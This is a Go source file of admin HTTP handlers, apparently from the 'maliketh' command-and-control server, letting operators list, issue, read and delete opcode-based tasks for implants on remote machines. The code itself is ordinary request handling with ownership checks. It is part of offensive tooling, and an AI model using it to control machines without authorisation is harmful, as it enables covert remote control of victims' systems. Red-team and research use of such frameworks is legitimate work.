package admin

import (
	"encoding/json"
	"net/http"

	"github.com/cbrnrd/maliketh/server-go/internal/model"
	"github.com/cbrnrd/maliketh/server-go/internal/server"
	"github.com/go-chi/chi/v5"
	"go.uber.org/zap"
)

// handleListTasks returns all tasks issued by the current operator.
func (h *Handler) handleListTasks() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		tasks, err := h.repos.Task.ListByOperator(r.Context(), operator.Username)
		if err != nil {
			h.logger.Error("failed to list tasks",
				zap.String("operator", operator.Username),
				zap.Error(err))
			server.InternalError(w, "Failed to list tasks")
			return
		}

		taskList := make([]map[string]any, len(tasks))
		for i, t := range tasks {
			taskList[i] = taskToJSON(t)
		}

		server.SuccessData(w, map[string]any{
			"status": true,
			"tasks":  taskList,
		})
	}
}

type addTaskRequest struct {
	ImplantID string `json:"implant_id"`
	Opcode    int    `json:"opcode"`
	Args      any    `json:"args"`
}

// handleAddTask creates a new task for an implant.
func (h *Handler) handleAddTask() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		var req addTaskRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			server.BadRequest(w, "Invalid request body")
			return
		}

		if req.ImplantID == "" {
			server.BadRequest(w, "implant_id is required")
			return
		}

		// Resolve implant (supports aliases)
		implant, err := h.repos.Implant.Resolve(r.Context(), req.ImplantID)
		if err != nil {
			h.logger.Debug("implant not found", zap.String("identifier", req.ImplantID))
			server.BadRequest(w, "Unknown implant")
			return
		}

		// Create task
		task, err := h.repos.Task.Create(
			r.Context(),
			operator.Username,
			implant.ImplantID,
			model.Opcode(req.Opcode),
			req.Args,
		)
		if err != nil {
			h.logger.Error("failed to create task",
				zap.String("operator", operator.Username),
				zap.String("implant_id", implant.ImplantID),
				zap.Error(err))
			server.InternalError(w, "Failed to create task")
			return
		}

		h.logger.Info("created task",
			zap.String("task_id", task.TaskID),
			zap.String("operator", operator.Username),
			zap.String("implant_id", implant.ImplantID),
			zap.Int("opcode", req.Opcode))

		server.SuccessData(w, map[string]any{
			"status": true,
			"task":   taskToJSON(task),
		})
	}
}

// handleGetTaskResult returns the result of a completed task.
func (h *Handler) handleGetTaskResult() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		taskID := chi.URLParam(r, "task_id")
		if taskID == "" {
			server.BadRequest(w, "task_id is required")
			return
		}

		task, err := h.repos.Task.GetByID(r.Context(), taskID)
		if err != nil {
			server.BadRequest(w, "Unknown task")
			return
		}

		// Verify ownership
		if task.OperatorName != operator.Username {
			h.logger.Warn("operator tried to access task they don't own",
				zap.String("task_id", taskID),
				zap.String("operator", operator.Username),
				zap.String("owner", task.OperatorName))
			server.Error(w, http.StatusForbidden, "Unauthorized")
			return
		}

		var result *string
		if task.Output != nil {
			result = task.Output
		}

		server.SuccessData(w, map[string]any{
			"status": true,
			"result": result,
		})
	}
}

// handleDeleteTask deletes a task.
func (h *Handler) handleDeleteTask() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		operator := GetOperator(r.Context())
		if operator == nil {
			server.Unauthorized(w, "Not authenticated")
			return
		}

		taskID := chi.URLParam(r, "task_id")
		if taskID == "" {
			server.BadRequest(w, "task_id is required")
			return
		}

		task, err := h.repos.Task.GetByID(r.Context(), taskID)
		if err != nil {
			server.BadRequest(w, "Unknown task")
			return
		}

		// Verify ownership
		if task.OperatorName != operator.Username {
			h.logger.Warn("operator tried to delete task they don't own",
				zap.String("task_id", taskID),
				zap.String("operator", operator.Username),
				zap.String("owner", task.OperatorName))
			server.Error(w, http.StatusForbidden, "Unauthorized")
			return
		}

		if err := h.repos.Task.Delete(r.Context(), taskID); err != nil {
			h.logger.Error("failed to delete task",
				zap.String("task_id", taskID),
				zap.Error(err))
			server.InternalError(w, "Failed to delete task")
			return
		}

		h.logger.Info("deleted task",
			zap.String("task_id", taskID),
			zap.String("operator", operator.Username))

		server.SuccessData(w, map[string]any{"status": true})
	}
}

func taskToJSON(t *model.Task) map[string]any {
	result := map[string]any{
		"task_id":       t.TaskID,
		"operator_name": t.OperatorName,
		"implant_id":    t.ImplantID,
		"opcode":        int(t.Opcode),
		"args":          t.Args,
		"status":        string(t.Status),
		"created_at":    t.CreatedAt,
	}
	if t.Output != nil {
		result["output"] = *t.Output
	}
	if t.ReadAt != nil {
		result["read_at"] = *t.ReadAt
	}
	if t.ExecutedAt != nil {
		result["executed_at"] = *t.ExecutedAt
	}
	return result
}
